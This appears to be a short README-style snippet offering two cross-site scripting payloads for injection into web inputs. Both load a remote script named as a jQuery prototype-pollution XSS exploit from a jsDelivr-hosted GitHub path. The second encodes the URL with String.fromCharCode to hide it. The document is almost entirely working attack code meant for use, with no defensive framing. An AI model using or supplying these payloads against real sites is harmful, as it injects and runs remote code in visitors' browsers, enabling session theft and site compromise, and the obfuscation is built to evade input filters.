> using ./qjuery_pollution_xss.js:

```js

<script src='https://cdn.jsdelivr.net/gh/yossefsabry/_scripts@main/qjuery_pollution_xss.js'></script>

```


if using the ./decode_script
> use this on input ( from ./decode_script )
```javascript
<script>(function(){var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,99,100,110,46,106,115,100,101,108,105,118,114,46,110,101,116,47,103,104,47,121,111,115,115,101,102,115,97,98,114,121,47,95,115,99,114,105,112,116,115,64,109,97,105,110,47,113,106,117,101,114,121,95,112,111,108,108,117,116,105,111,110,95,120,115,115,46,106,115);document.head.appendChild(s);})()</script>
```


